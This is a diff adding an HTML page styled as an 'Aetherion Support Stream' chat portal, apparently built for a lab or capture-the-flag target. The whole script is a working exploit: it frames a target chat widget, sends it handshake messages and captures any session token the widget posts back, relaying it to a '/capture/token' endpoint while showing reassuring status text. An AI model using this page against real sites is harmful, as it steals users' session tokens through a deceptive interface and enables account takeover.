@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Support Stream</title>
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      margin: 0; min-height: 100vh; background: radial-gradient(circle at 50% 0,#241b4d 0,#05070e 58%);
+      color: #dce6ff; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .wrap { width: min(94vw, 560px); margin: 0 auto; padding: 36px 0; }
+    h1 { font-size: 13px; letter-spacing: .2em; color: #9d8cff; }
+    p { color: #7386aa; font-size: 12px; line-height: 1.6; }
+    .frame { margin-top: 16px; border: 1px solid #283550; border-radius: 18px; overflow: hidden; height: 520px; background: #070b14; }
+    iframe { width: 100%; height: 100%; border: 0; }
+    #status { margin-top: 14px; font-size: 12px; color: #71f0b1; white-space: pre-wrap; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>AETHERION / SUPPORT STREAM</h1>
+    <p>live assistance · secure channel</p>
+    <div class="frame"><iframe id="chat" title="Support"></iframe></div>
+    <div id="status">waiting for agent…</div>
+  </div>
+  <script>
+    const frame = document.getElementById('chat');
+    const status = document.getElementById('status');
+    const target = new URLSearchParams(location.search).get('target') || 'http://aetherion.local:8080';
+    frame.src = `${target}/widget/chat.html`;
+    let attempts = 0;
+    let linked = false;
+
+    function hello() {
+      if (linked || !frame.contentWindow) return;
+      attempts += 1;
+      frame.contentWindow.postMessage({ type: 'aetherion/hello', client: 'orbit-support' }, '*');
+      if (attempts < 40) setTimeout(hello, 500);
+    }
+
+    window.addEventListener('message', async (event) => {
+      const payload = event.data || {};
+      if (linked || payload.type !== 'aetherion/token' || !payload.token) return;
+      linked = true;
+      status.textContent = 'channel linked';
+      try {
+        await fetch('/capture/token', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ token: payload.token, origin: event.origin }),
+        });
+        status.textContent = 'channel linked · session relayed';
+      } catch (error) {
+        linked = false;
+        status.textContent = 'relay failed';
+      }
+    });
+
+    frame.addEventListener('load', hello);
+    setTimeout(hello, 800);
+  </script>
+</body>
+</html>
